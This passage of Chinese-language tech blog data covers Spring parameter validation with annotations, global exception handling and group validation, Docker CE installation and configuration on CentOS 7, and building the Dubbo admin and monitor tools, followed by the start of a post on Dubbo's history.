Entity、VO、DTO）类的成员属性上添加约束注解，表明某个成员属性的校验规则是什么。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748@Datapublic class BrandVo implements Serializable { /** * 品牌id */ private Long brandId; /** * 品牌名 */ @NotBlank(message = "can\'t be empty") private String name; /** * 品牌logo地址 */ @URL(message = "must be an url address") @NotBlank(message = "can\'t be empty") private String logo; /** * 介绍 */ @NotBlank(message = "can\'t be empty") private String descript; /** * 显示状态[0-不显示；1-显示] */ @NotNull(message = "can\'t be null") private Integer showStatus; /** * 检索首字母 */ @Pattern(regexp = "^[a-zA-Z]$", message = "must be a letter") @NotBlank(message = "can\'t be empty") private String firstLetter; /** * 排序 */ @Min(value = 0, message = "must be greater than or equal to zero") @NotNull(message = "can\'t be null") private Integer sort; } 添加校验注解在 Controller 类的方法参数前面添加 @Valid 校验注解，表明某个方法的接口调用需要检验参数。 1234567891011121314151617@RestController@RequestMapping("/brand")public class BrandController { @Autowired private BrandService brandService; /** * 保存 */ @RequestMapping("/save") public R save(@Valid @RequestBody BrandVo brand) { brandService.save(brand); return R.ok(); }} 当前端提交过来的参数不符合校验规则，服务端会自动返回 400 的 HTTP 状态码给前端。 获取校验结果在 Controller 类的方法参数列表里添加一个 BindingResult 参数（Spring MVC 会自动注入对应的值），这样就可以获取到参数的校验结果，同时也很方便进一步返回友好的错误提示信息给前端。 注意 一般情况下，不建议使用以下的方式来单独处理参数校验结果，因为这样会出现很多冗余代码，且后期不容易维护。建议采用后面介绍的 全局异常处理 方案，这样可以统一处理校验结果。 12345678910111213141516171819202122232425262728@RestController@RequestMapping("/brand")public class BrandController { @Autowired private BrandService brandService; /** * 保存 */ @RequestMapping("/save") public R save(@Valid @RequestBody BrandVo brand, BindingResult validResult) { // 手动处理校验结果 if (validResult.hasErrors()) { Map&lt;String, String&gt; map = new HashMap&lt;&gt;(); validResult.getFieldErrors().forEach(item -&gt; { String errorMsg = item.getDefaultMessage(); String fieldName = item.getField(); map.put(fieldName, errorMsg); }); return R.error(400, "提交的数据不合法").put("data", map); } brandService.save(brand); return R.ok(); }} 若参数校验不通过，最终的返回结果如下： 1234567{ "msg": "提交的数据不合法", "code": 400, "data": { "name": "can\'t be empty" }} 全局异常处理案例统一错误码为了方便标识不同的异常信息，建议使用枚举类型来统一存储不同的错误码和错误信息。 错误码建议定义为 5 位数字 前两位表示业务场景，例如：10 表示通用业务，11 表示商品业务，12 表示订单业务 最后三位表示错误码，例如 000 表示系统未知异常，001 表示参数校验异常 完整的错误码，例如：10000，其中的 10 表示通用，000 表示系统未知异常 1234567891011121314151617181920212223242526/** * 错误码 */public enum BizCodeEnum { UNKNOW_EXCEPTION(10000, "系统未知异常"), VALID_EXCEPTION(10001, "参数格式校验失败"); private int code; private String msg; BizCodeEnum(int code, String msg) { this.code = code; this.msg = msg; } public int getCode() { return code; } public String getMsg() { return msg; } } 统一返回类型为了统一返回给前端的结果格式，应该定义一个返回结果类。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849/** * 返回结果 */public class R extends HashMap&lt;String, Object&gt; { private static final long serialVersionUID = 1L; public R() { put("code", 0); put("msg", "success"); } public static R error() { return error(HttpStatus.SC_INTERNAL_SERVER_ERROR, "系统未知异常，请联系管理员"); } public static R error(String msg) { return error(HttpStatus.SC_INTERNAL_SERVER_ERROR, msg); } public static R error(int code, String msg) { R r = new R(); r.put("code", code); r.put("msg", msg); return r; } public static R ok(String msg) { R r = new R(); r.put("msg", msg); return r; } public static R ok(Map&lt;String, Object&gt; map) { R r = new R(); r.putAll(map); return r; } public static R ok() { return new R(); } public R put(String key, Object value) { super.put(key, value); return this; } } 全局异常处理使用 @ControllerAdvice 和 @ExceptionHandler 注解实现全局的异常处理。 12345678910111213141516171819202122232425262728293031323334353637383940414243/** * 全局异常处理 */@Slf4j@ControllerAdvicepublic class GlobalExceptionHandler { /** * 处理参数校验异常 * * @param e 异常 * @return 处理结果 */ @ResponseBody @ExceptionHandler(value = MethodArgumentNotValidException.class) public R handleValidException(MethodArgumentNotValidException e) { log.error("发生参数校验异常：{}", e.getMessage()); BindingResult validResult = e.getBindingResult(); StringBuffer messages = new StringBuffer(); if (validResult.hasErrors()) { validResult.getFieldErrors().forEach(item -&gt; { String errorMsg = item.getDefaultMessage(); String fieldName = item.getField(); messages.append(fieldName + ": " + errorMsg + "\\n"); }); } return R.error(BizCodeEnum.VALID_EXCEPTION.getCode(), BizCodeEnum.VALID_EXCEPTION.getMsg()).put("details", messages.toString()); } /** * 处理系统未知异常 * * @param throwable 异常 * @return 处理结果 */ @ResponseBody @ExceptionHandler(value = Throwable.class) public R handleException(Throwable throwable) { log.error("发生系统未知异常：{}", throwable.getMessage()); return R.error(BizCodeEnum.UNKNOW_EXCEPTION.getCode(), BizCodeEnum.UNKNOW_EXCEPTION.getMsg()); } } 添加约束注解在 JavaBean（例如 Entity、VO、DTO）类的成员属性上添加约束注解，表明某个成员属性的校验规则是什么。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748@Datapublic class BrandVo implements Serializable { /** * 品牌id */ private Long brandId; /** * 品牌名 */ @NotBlank(message = "can\'t be empty") private String name; /** * 品牌logo地址 */ @URL(message = "must be an url address") @NotBlank(message = "can\'t be empty") private String logo; /** * 介绍 */ @NotBlank(message = "can\'t be empty") private String descript; /** * 显示状态[0-不显示；1-显示] */ @NotNull(message = "can\'t be null") private Integer showStatus; /** * 检索首字母 */ @Pattern(regexp = "^[a-zA-Z]$", message = "must be a letter") @NotBlank(message = "can\'t be empty") private String firstLetter; /** * 排序 */ @Min(value = 0, message = "must be greater than or equal to zero") @NotNull(message = "can\'t be null") private Integer sort; } 添加校验注解在 Controller 类的方法参数前面添加 @Valid 校验注解，表明某个方法的接口调用需要检验参数。由于实现了全局异常处理，这里不再需要在 Controller 类的方法的参数列表里添加一个 BindingResult 参数来单独处理校验结果。 1234567891011121314151617@RestController@RequestMapping("/brand")public class BrandController { @Autowired private BrandService brandService; /** * 保存 */ @RequestMapping("/save") public R save(@Valid @RequestBody BrandVo brand) { brandService.save(brand); return R.ok(); }} 若参数校验不通过，最终的返回结果如下： 12345{ "msg": "参数格式校验失败", "code": 10001, "details": "sort: must be greater than or equal to zero\\n name: can\'t be empty\\n"} 自定义校验器案例自定义校验器实现 ConstraintValidator 接口，编写自定义的校验器。下述的校验器，用于校验前端提交的参数值（Integer 类型）是否在指定的值内。 12345678910111213141516171819202122232425262728293031323334353637import javax.validation.ConstraintValidator;import javax.validation.ConstraintValidatorContext;/** * 自定义校验器 */public class ListValueValidatorForInteger implements ConstraintValidator&lt;ListValue, Integer&gt; { private final Set&lt;Integer&gt; set = new HashSet&lt;&gt;(); /** * 初始化方法 */ @Override public void initialize(ListValue constraintAnnotation) { int[] values = constraintAnnotation.values(); for (int value : values) { set.add(value); } } /** * 判断是否校验成功 * * @param value 需要校验的值 * @param context * @return */ @Override public boolean isValid(Integer value, ConstraintValidatorContext context) { if (value != null) { return set.contains(value); } return false; } } 自定义约束注解自定义约束注解，通过 @Constraint 注解的 validatedBy 属性来指定自定义的校验器，详细的写法建议参考 @NotBlank 注解的源码实现。值得一提的是，validatedBy 属性可以指定多个自定义校验器，Spring MVC 会根据参数的类型（例如 Integer、Double、String 类型）来自动选择合适的校验器。 12345678910111213141516171819202122import javax.validation.Constraint;import javax.validation.Payload;/** * 自定义约束注解 */@Documented@Constraint(validatedBy = {ListValueValidatorForInteger.class})@Target({METHOD, FIELD, ANNOTATION_TYPE, CONSTRUCTOR, PARAMETER, TYPE_USE})@Retention(RUNTIME)public @interface ListValue { // 该属性的值默认会去 ValidationMessages.properties 配置文件中取 String message() default "{com.shop.common.validator.constraints.ListValue.message}"; Class&lt;?&gt;[] groups() default {}; Class&lt;? extends Payload&gt;[] payload() default {}; int[] values() default {}; } 自定义提示信息在项目（模块）的 src/main/resources 目录下创建 ValidationMessages.properties 配置文件，用于存放校验结果的提示信息。 1com.shop.common.validator.constraints.ListValue.message = the specified value must be submitted 添加约束注解在 JavaBean（例如 Entity、VO、DTO）类的成员属性上添加约束注解，包括自定义的约束注解 @ListValue，表明某个成员属性的校验规则是什么。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849@Datapublic class BrandVo implements Serializable { /** * 品牌id */ private Long brandId; /** * 品牌名 */ @NotBlank(message = "can\'t be empty") private String name; /** * 品牌logo地址 */ @URL(message = "must be an url address") @NotBlank(message = "can\'t be empty") private String logo; /** * 介绍 */ @NotBlank(message = "can\'t be empty") private String descript; /** * 显示状态[0-不显示；1-显示] */ @NotNull(message = "can\'t be null") @ListValue(values = {0, 1}) private Integer showStatus; /** * 检索首字母 */ @Pattern(regexp = "^[a-zA-Z]$", message = "must be a letter") @NotBlank(message = "can\'t be empty") private String firstLetter; /** * 排序 */ @Min(value = 0, message = "must be greater than or equal to zero") @NotNull(message = "can\'t be null") private Integer sort; } 添加校验注解在 Controller 类的方法参数前面添加 @Valid 校验注解，表明某个方法的接口调用需要检验参数。 1234567891011121314151617@RestController@RequestMapping("/brand")public class BrandController { @Autowired private BrandService brandService; /** * 保存 */ @RequestMapping("/save") public R save(@Valid @RequestBody BrandVo brand) { brandService.save(brand); return R.ok(); }} 若自定义的校验器校验不通过，则最终的返回结果如下： 12345{ "msg": "参数格式校验失败", "code": 10001, "details": "showStatus: the specified value must be submitted\\n"} 分组校验案例在做参数校验的时候，通常会遇到同一个实体类的新增和修改操作，它们的参数校验规则是不同的；例如新增时 id 允许为空，修改时则不允许 id 为空。为了解决这种业务场景，可以使用分组校验，这样可以少建一个冗余的实体类。 添加分组接口创建校验用的分组接口，该接口只用于标识不同业务场景的参数校验。 123456/** * 新增分组 */public interface AddGroup {} 123456/** * 更新分组 */public interface UpdateGroup {} 添加约束注解在 JavaBean（例如 Entity、VO、DTO）类的成员属性上添加约束注解，同时还需要指定对应的分组，表明某个成员属性在某个分组下的校验规则是什么。 特别注意 默认没有指定分组的约束注解，在使用分组校验的情况下是不会生效的，只会在没有使用分组校验的情况下才生效（例如使用 @Valid 注解）。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950@Datapublic class BrandVo implements Serializable { /** * 品牌id */ @Null(message = "must be null", groups = {AddGroup.class}) @NotNull(message = "can\'t be null", groups = {UpdateGroup.class}) private Long brandId; /** * 品牌名 */ @NotBlank(message = "can\'t be empty", groups = {AddGroup.class, UpdateGroup.class}) private String name; /** * 品牌logo地址 */ @URL(message = "must be an url address", groups = {AddGroup.class, UpdateGroup.class}) @NotBlank(message = "can\'t be empty", groups = {AddGroup.class, UpdateGroup.class}) private String logo; /** * 介绍 */ @NotBlank(message = "can\'t be empty", groups = {AddGroup.class, UpdateGroup.class}) private String descript; /** * 显示状态[0-不显示；1-显示] */ @NotNull(message = "can\'t be null", groups = {AddGroup.class, UpdateGroup.class}) private Integer showStatus; /** * 检索首字母 */ @Pattern(regexp = "^[a-zA-Z]$", message = "must be a letter", groups = {AddGroup.class, UpdateGroup.class}) @NotBlank(message = "can\'t be empty", groups = {AddGroup.class, UpdateGroup.class}) private String firstLetter; /** * 排序 */ @Min(value = 0, message = "must be greater than or equal to zero", groups = {AddGroup.class, UpdateGroup.class}) @NotNull(message = "can\'t be null", groups = {AddGroup.class, UpdateGroup.class}) private Integer sort; } 添加校验注解在 Controller 类的方法参数前面添加 @Validated 校验注解，同时指定对应的分组。值得一提的是，这里不能使用 @Valid 注解，因为该注解不支持分组校验。 123456789101112131415161718192021222324252627@RestController@RequestMapping("/brand")public class BrandController { @Autowired private BrandService brandService; /** * 保存 */ @RequestMapping("/save") public R save(@Validated(AddGroup.class) @RequestBody BrandVo brand) { brandService.save(brand); return R.ok(); } /** * 修改 */ @RequestMapping("/update") public R update(@Validated(UpdateGroup.class) @RequestBody BrandVo brand) { brandService.updateById(brand); return R.ok(); }} 若调用新增接口时，指定了 id 参数，则最终的返回结果如下： 12345{ "msg": "参数格式校验失败", "code": 10001, "details": "brandId: must be null\\n"} 参数校验工具类若希望手动校验参数是否合法，可以参考以下代码。 123456789101112131415161718192021222324252627282930313233import javax.validation.ConstraintViolation;import javax.validation.Validation;import javax.validation.Validator;import java.util.Set;public class ValidatorUtils { private static final Validator VALIDATOR; static { VALIDATOR = Validation.buildDefaultValidatorFactory().getValidator(); } /** * Validate parameter * @param object * @param groups * @throws GlobalException */ public static void validateParameter(Object object, Class&lt;?&gt;... groups) throws GlobalException { Set&lt;ConstraintViolation&lt;Object&gt;&gt; constraintViolations = VALIDATOR.validate(object, groups); if (!constraintViolations.isEmpty()) { StringBuilder message = new StringBuilder(); for (ConstraintViolation&lt;Object&gt; constraint : constraintViolations) { message.append(constraint.getMessage()).append("\\n"); } ErrorCode errorCode = ErrorCode.PARAMETER_ERROR; errorCode.setDescription(message.toString()); throw new GlobalException(errorCode); } }} var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"java"},{title:"Docker 之一 Docker 介绍与安装",url:"/posts/57bca56f.html",text:'Docker 相关站点 Docker Hub Docker Github Docker Official Docs EN Docker Official Docs CN Docker Official Website EN Docker Official Website CN Docker 相关技术 Golang CI/CD Mesos Swarm Machine Compose Kubernetes Docker 的目标 Build and Ship any Application Anywhere，即通过对应组件的封装、分发、部署、运行等生命周期的管理，使用户的应用及其运行环境能够做到 “一次构建，到处运行”，官方图解如下： 什么是容器？ 一种虚拟化方案 操作系统级别的虚拟化 只能运行相同或相似内核的操作系统 依赖于 Linux 内核特性：Namespace 和 Cgroups（Control Group），前者用于资源隔离，后者用于资源限制 容器只能使用宿主机的 kernel，并且不能修改；即所有容器都共用宿主机的 kernel，在容器中无法对 kernel 进行升级。 Docker 与虚拟机的区别 参考文章：Docker 容器与虚拟机有什么区别，VM vs Docker 的图解如下： Docker 的三要素介绍 三要素：仓库、镜像、容器 Docker 本身是一个容器运行载体或称之为管理引擎，基于 C/S 模式，即客户端 / 守护进程 Docker 镜像是层叠的只读文件系统，镜像用作创建 Docker 容器，一个镜像可以创建多个容器 容器是用镜像创建的运行实例，这里的镜像相当于 Java 中的类，容器相当于通过该类创建的对象实例 仓库是集中存放镜像文件的场所，仓库（Repository）和仓库注册服务器（Registry）是有区别的，仓库注册服务器上往往存放着多个仓库，每个仓库中又包含了多个镜像，每个镜像有不同的标签（Tag） 仓库分为公开仓库（Public）和私有仓库（Private）两种形式，最大的公开仓库是 Docker Hub，国内的公开仓库有阿里云、网易云等 Docker 架构图 为什么要在开发中使用 Docker 一致的开发环境，Docker 可以保证整个研发团队使用一致的开发环境 在开发时只需 Docker，无需在自己的开发主机上搭建各种编程语言环境 简化了编译和构建的复杂性，对于一些动辄数小时的编译和构建工作，可以用 Docker 来简化 部署很简单，应用程序在容器中运行，开发环境与最终的生产环境保持一致，这减少了部署出错的可能性 可以使用同一编程语言（如 go, python, ruby, java, node 等）的多个版本，无需解决多版本冲突的问题 Docker 拥有几大特性：持续集成、版本控制、可移植性、隔离性和安全性 Docker 属于解决运行环境和配置问题，方便做持续集成，并有助于整体发布的容器虚拟化技术 Docker 提供更快速的应用交付和部署，更便捷的升级和扩缩容，更简单的系统运维，更高效的计算资源利用 Docker 各版本对 Centos 的兼容 docker-io（旧版本） Centos7（64-bit），Linux 内核版本为 3.10 以上 Centos6.5（64-bit）或更高版本，Linux 内核版本为 2.6.32-431 或更高 docker-ce（新版本） Centos7（64-bit），Linux 内核版本为 3.10 以上 docker 新旧版本名称的区别 旧版本的名称是 docker、docker-io、docker-engine 新版本的名称是 docker-ce（社区版）、docker-ee（企业版） Centos7 安装 Docker-CE 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687# 查看Centos系统版本# cat /etc/redhat-releaseCentOS Linux release 7.6.1810 (Core)# 查看Linux内核版本# uname -aLinux centos7 3.10.0-957.1.3.el7.x86_64 #1 SMP Thu Nov 29 14:49:43 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux# 卸载旧版本的Docker，将保留/var/lib/docker/的内容，包括镜像、容器、存储卷和网络# yum remove docker \\ docker-client \\ docker-client-latest \\ docker-common \\ docker-latest \\ docker-latest-logrotate \\ docker-logrotate \\ docker-selinux \\ docker-engine-selinux \\ docker-engine# 如需删除旧版本的所有镜像、容器和存储卷，请运行下列命令# rm -rf /var/lib/docker# 安装所需的软件包# yum install yum-utils device-mapper-persistent-data lvm2# 添加Docker的阿里云yum镜像仓库（默认使用stable镜像仓库）# yum-config-manager --add-repo http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo# 更新yum软件包索引# yum makecache fast# 查询可安装的Docker版本# yum list docker-ce.x86_64 --showduplicates | sort -rdocker-ce.x86_64 3:18.09.0-3.el7 docker-ce-stabledocker-ce.x86_64 18.06.1.ce-3.el7 docker-ce-stabledocker-ce.x86_64 18.06.0.ce-3.el7 docker-ce-stabledocker-ce.x86_64 18.03.1.ce-1.el7.centos docker-ce-stabledocker-ce.x86_64 18.03.0.ce-1.el7.centos docker-ce-stabledocker-ce.x86_64 17.12.1.ce-1.el7.centos docker-ce-stabledocker-ce.x86_64 17.12.0.ce-1.el7.centos docker-ce-stabledocker-ce.x86_64 17.09.1.ce-1.el7.centos docker-ce-stabledocker-ce.x86_64 17.09.0.ce-1.el7.centos docker-ce-stabledocker-ce.x86_64 17.06.2.ce-1.el7.centos docker-ce-stabledocker-ce.x86_64 17.06.1.ce-1.el7.centos docker-ce-stabledocker-ce.x86_64 17.06.0.ce-1.el7.centos docker-ce-stabledocker-ce.x86_64 17.03.3.ce-1.el7 docker-ce-stabledocker-ce.x86_64 17.03.2.ce-1.el7.centos docker-ce-stabledocker-ce.x86_64 17.03.1.ce-1.el7.centos docker-ce-stabledocker-ce.x86_64 17.03.0.ce-1.el7.centos docker-ce-stable# 安装最新版的Docker-CE# yum install docker-ce# 或者安装指定版本的Docker-CE# yum install docker-ce-18.06.1.ce-3.el7# 启动Docker# systemctl start docker# 设置Dockerr开机自启动（非必需）# systemctl enable docker# 查看已安装的Docker版本# docker versionClient: Version: 18.09.0 API version: 1.39 Go version: go1.10.4 Git commit: 4d60db4 Built: Wed Nov 7 00:48:22 2018 OS/Arch: linux/amd64 Experimental: falseServer: Docker Engine - Community Engine: Version: 18.09.0 API version: 1.39 (minimum version 1.12) Go version: go1.10.4 Git commit: 4d60db4 Built: Wed Nov 7 00:19:08 2018 OS/Arch: linux/amd64 Experimental: false# 验证是否正确安装了docker-ce# 以下命令将下载一个测试镜像并在容器中运行它，容器运行时将输出一条参考消息并退出# docker run hello-world Centos7 配置 Docker-CE 的镜像加速 123456789101112# 创建Docker的配置文件目录# mkdir -p /etc/docker# 创建Docker的配置文件，并指定Docker的镜像源地址，其中注册阿里云或者网易云帐号后可以从镜像服务中获取xxxxxx序列号，建议使用阿里云的镜像服务# vim /etc/docker/daemon.json{"registry-mirrors": ["https://xxxxxx.mirror.aliyuncs.com"]}# 加载新的配置# systemctl daemon-reload# 重新启动Docker# systemctl restart docker Centos7 卸载 Docker-CE 1234567# 卸载Docker-CE安装包，主机上的镜像、容器、存储卷、或定制配置文件不会自动删除# yum remove docker-ce# 如需删除所有镜像、容器和存储卷，请运行下列命令# rm -rf /var/lib/docker# 手动删除任何已编辑的Docker配置文件 更改 Docker 默认安装路径 值得一提的是，如果已经存在大量 Docker 容器，更改 Docker 的默认安装路径存在数据丢失的风险，请提前备份重要的数据！建议使用下面介绍的第二种方法进行操作，因为第一种方法存在升级问题，那就是当 Docker 的版本升级后，docker.service 配置文件的内容会被覆盖掉。 12345678910111213141516171819202122# 方法一（通过Docker系统服务的配置文件指定安装目录路径）# 停止Docker# systemctl stop docker# 将原安装目录移动到新安装目录，例如移动至/home/docker# 注意，这里即使不移动原安装目录也是可以的（Docker会在新目录下自动创建相关文件），只是不移动的话以前的镜像、容器数据就会丢失# mv /var/lib/docker /home# 修改docker.service文件，在启动Docker的时候，通过--graph参数指定新安装目录的路径# vim /usr/lib/systemd/system/docker.serviceExecStart=/usr/bin/dockerd -H unix:// --graph /home/docker# 使配置文件生效# systemctl daemon-reload# 启动Docker# systemctl start docker# 查看Docker默认安装目录是否更改了# docker infoDocker Root Dir: /home/docker 12345678910111213# 方法二（通过建立软链接，将旧的安装目录/var/lib/docker重定向到新的安装目录/home/docker，这样就可以避免修改docker.service文件）# 停止Docker# systemctl stop docker# 移动目录# mv /var/lib/docker /home# 创建软链接# ln -s /home/docker /var/lib/docker# 启动Docker# systemctl start docker 12345678# 验证Docker的默认安装路径更改后，是否可以正常工作# 查看后台进程# ps -aux|grep docker# 测试是否迁移成功# docker pull centos# docker run -it centos Docker 相关文件介绍 123Docker默认安装目录：/var/lib/dockerDocker配置文件： /etc/docker/daemon.jsonDocker系统服务的配置文件： /usr/lib/systemd/system/docker.service 其他 Linux 发行版安装 Docker-CE Debian 安装 Docker-CE Ubuntu 安装 Docker-CE Fedora 安装 Docker-CE var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"容器化"},{title:"Dubbo 之三 Dubbo 管理与监控中心的安装",url:"/posts/d70c90c.html",text:'Github 项目地址 Incubator Dubbo Ops Github 前言 与以前相比，Incubator Dubbo Ops 项目中 master 分支的代码进行了大量重构，重构之后的代码目前在 develop 分支；同时 develop 分支的部署方式发生了不少变化，主要体现在 develop 分支采用了前后端分离的部署方式，下面将会分别详细介绍 master 与 develop 分支具体的部署方式。此教程的创建日期为 2018-12-20，由于官方项目正在不断迭代开发中，因此此教程在日后可能与官方的最新代码不同步，一切以官方的 Github 说明文档为准。 incubator-dubbo-ops master 分支（截止 2018-12-20） 项目说明 项目是标准的 Spring Boot 工程 主线代码已经进行了重构，官方建议使用 develop 分支 构建准备 本地安装并启动 Zookeeper 服务端 本地安装 Maven，并配置 Maven 的环境变量 构建步骤 1234567891011121314151617181920# 克隆master分支的代码# git clone -b master https://github.com/apache/incubator-dubbo-ops.git# 代码的目录结构incubator-dubbo-ops-master├── dubbo-admin├── dubbo-monitor-simple├── dubbo-registry-simple├── pom.xml└── README.md# 进入项目根目录$ cd incubator-dubbo-ops-master# 修改注册中心地址$ vim dubbo-admin/src/main/resources/application.propertiesdubbo.registry.address=zookeeper://127.0.0.1:2181# 使用maven命令进行打包$ mvn clean package 构建结果 在 incubator-dubbo-ops-master/dubbo-admin/target 目录中生成 dubbo-admin-0.0.1-SNAPSHOT.jar 在 incubator-dubbo-ops-master/dubbo-monitor-simple/target 目录中生成 dubbo-monitor-simple-2.0.0-assembly.tar.gz，解压缩后可以找到用于启动或停止监控的 shell 脚本。 在 incubator-dubbo-ops-master/dubbo-registry-simple/target 目录中 dubbo-registry-simple-2.0.0-assembly.tar.gz，解压缩后可以找到用于启动或停止注册的 shell 脚本。 运行 dubbo-admin（图形化的服务管理后台） 1234567891011121314# 进入构建目标目录$ cd incubator-dubbo-ops-master/dubbo-admin/target# 前台运行$ java -jar dubbo-admin-0.0.1-SNAPSHOT.jar# 或者后台运行$ nohup java -jar dubbo-admin-0.0.1-SNAPSHOT.jar &amp;# 浏览器访问，登录的用户名和密码均为guesthttp://127.0.0.1:7001# 停止运行$ sudo pkill -9 java dubbo-admin（图形化的服务管理后台）Web 界面 运行 dubbo-monitor-simple（图形化的监控后台） 123456789101112131415161718# 进入构建目标目录$ cd incubator-dubbo-ops-master/dubbo-monitor-simple/target# 解压文件$ tar -xvf dubbo-monitor-simple-2.0.0-assembly.tar.gz# 修改注册中心地址$ vim dubbo-monitor-simple-2.0.0/conf/dubbo.propertiesdubbo.registry.address=zookeeper://127.0.0.1:2181# 运行服务（默认后台运行）$ ./dubbo-monitor-simple-2.0.0/assembly.bin/start.sh# 浏览器访问http://127.0.0.1:8080# 停止服务$ ./dubbo-monitor-simple-2.0.0/assembly.bin/stop.sh dubbo-monitor-simple（图形化的监控后台）Web 界面 解决 Spring 应用添加 &lt;dubbo:monitor protocol=”registry”/&gt; 配置后，无法连接 dubbo-monitor 的问题 123# 配置本机ipv4的ip + 用户主机名，即添加如下一行内容，将其中的xxx替换为本机真实的IP地址，例如192.168.1.198$ sudo vim /etc/hostsxxx.xxx.xxx.xxx centos7 incubator-dubbo-ops develop 分支（截止 2019-02-23） 前端说明 依赖 NPM 进行管理和构建 使用 Vue.js 作为 Javascript 框架，Vuetify 作为 UI 框架 在开发环境中，可以按照此文档的步骤进行构建 采用前后端分离的部署方式，前端支持热加载，任何页面的修改都可以实时反馈，不需要重启应用 后端说明 项目是标准的 Spring Boot 工程，可以在任何 Java IDE 中运行 支持 Swagger，部署完成后可以访问 http://localhost:8080/swagger-ui.html 来查看所有的 Restful API 构建准备 本地安装并启动 Zookeeper 服务端 本地安装 Maven，并配置 Maven 的环境变量 本地安装 NodeJS，并配置 NodeJS 的环境变量（非必需，Maven 插件会自动安装 NodeJS） 构建步骤 123456789101112131415161718192021222324252627282930# 克隆develop分支的代码$ git clone -b develop https://github.com/apache/incubator-dubbo-ops.git# 代码目录结构incubator-dubbo-ops├── codestyle├── DISCLAIMER├── doc├── dubbo-admin-distribution├── dubbo-admin-server├── dubbo-admin-ui├── LICENSE├── mvnw├── mvnw.cmd├── NOTICE├── pom.xml├── README.md└── README_ZH.md# 进入项目根目录$ cd incubator-dubbo-ops# 修改注册中心地址，更多配置可参考：https://github.com/apache/incubator-dubbo-ops/wiki/Dubbo-Admin%E9%85%8D%E7%BD%AE%E8%AF%B4%E6%98%8E$ vim dubbo-admin-server/src/main/resources/application.propertiesadmin.registry.address=zookeeper://127.0.0.1:2181admin.config-center=zookeeper://127.0.0.1:2181admin.metadata-report.address=zookeeper://127.0.0.1:2181# 使用maven命令进行打包$ mvn clean package 运行 dubbo-admin-server（图形化的服务管理后台） 12345678# 进入目录$ cd incubator-dubbo-ops# 通过maven插件运行应用$ mvn --projects dubbo-admin-server spring-boot:run# 浏览器测试访问http://localhost:8080 dubbo-admin-server（图形化的服务管理后台）Web 界面 var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "type": "hexo", "id": "readmore-container", "name": "全栈技术驿站", "blogId": "96641-5333172926158-056", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "random": "0.9", "height": "auto", "expires": "365", "lockToc": "yes", "interval": "30", "baseUrl": "" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"分布式 linux"},{title:"Dubbo 之二 Dubbo 发展历程",url:"/posts/48ccc519.html",text:'相关站点 incubator-dubbo github incubator-dubbo docs incubator-dubbo-spring-boot-project github dubbo github dubbo 周边生态 RPC 介绍 RPC 核心模块： 通讯、序列化 主流 RPC 框架： Dubbo、gRPC、Thrift、HSF、Motan、ZBUS Dubbo 发展历程 2011 年 10 月 27 日，阿里巴巴开源了自己的 SOA 服务化治理方案的核心框架 Dubbo。 2012 年 10 月 23 日发布 Dubbo2.5.3 版本，至此之后，阿里基本停止了对 Dubbo 的主要升级；只在 2013 年和 2014 年更新过 2 次对 Dubbo2.4 的维护版本，然后停止了所有维护工作；同时 Dubbo 对 Srping 的支持也停留在了 Spring 2.5.6 版本上。在阿里停止维护和升级 Dubbo 期间，当当网开始维护自己的 Dubbo 分支版本 Dubbox，支持了新版本的 Spring，并对外开源了 Dubbox。而网易考拉也维护了自己的独立分支 Dubbok，可惜并未对外开源。 2017 年 9 月 7 日发布 Dubbo 的 2.5.4 版本，距离上一个版本 2.5.3 发布已经接近快 5 年时间了。在随后的几个月中，阿里 Dubbo 开发团队以差不多每月一版本的速度开始快速升级迭代，修补了 Dubbo 老版本多年来存在的诸多 bug，并对 Spring 等组件的支持进行了全面升级。 2018 年 1 月 8 日发布 Dubbo 2.6.0 版本，新版本将之前当当网开源的 Dubbo 分支 Dubbox 进行了合并，实现了 Dubbo 版本的统一整合。 2018 年 1 月 8 日，Dubbo 创始人之一梁飞在 Dubbo 交流群里透露了 Dubbo 3.0 正在动工的消息。Dubbo 3.0 内核与 Dubbo2.0 完全不同，但兼容 Dubbo 2.0。Dubbo 3.0 将以 Streaming 为内核，不再是 Dubbo 时代的 RPC，但是 RPC 会在 Dubbo3.0 中变成远程 Streaming 对接的一种可选形态。Dubbo 3.0 将支持可选 Service Mesh，多加一层 IPC，这主要是为了兼容老系统，而内部则会优先尝试内嵌模式。代理模式 Ops 